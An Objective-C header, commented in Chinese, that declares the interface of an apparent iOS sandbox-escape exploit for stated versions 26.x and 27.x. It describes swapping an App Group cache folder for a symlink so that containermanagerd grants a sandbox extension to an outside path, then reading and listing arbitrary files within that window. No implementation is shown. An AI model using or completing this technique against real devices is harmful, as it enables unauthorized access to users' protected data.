//
//  worse_query.h
//  iOS 26.0 ~ 26.7.2 / 27.0 ~ 27.2 沙箱逃逸
//  原理：App Group 的 Library/Caches 换成符号链接，
//       containermanagerd 解析链接后为目标签发 sandbox extension，
//       却不校验目标是否仍在容器内。
//
#ifndef worse_query_h
#define worse_query_h

#import <Foundation/Foundation.h>
#include <stdint.h>

#ifdef __cplusplus
extern "C" {
#endif

// 返回 >=0 为 sandbox extension handle，<0 为错误码
//   -1   App Group 不可用
//   -2   dlopen/dlsym 失败
//   -3   container_query_create 失败
//   -4   符号链接创建失败
//   -5   containermanagerd 拒绝查询
//   -6   sandbox_extension_consume 失败
int64_t wq_acquire(NSString *target,
                   NSString *group,
                   BOOL altFlags,
                   BOOL createDir);

void wq_release(int64_t handle);

// 在提权窗口内执行 body
BOOL wq_with(NSString *target, NSString *group, void (^body)(void));

// 便利函数
NSData *wq_read(NSString *path, NSString *group);
NSArray<NSString *> *wq_list(NSString *dir, NSString *group);

#ifdef __cplusplus
}
#endif
#endif
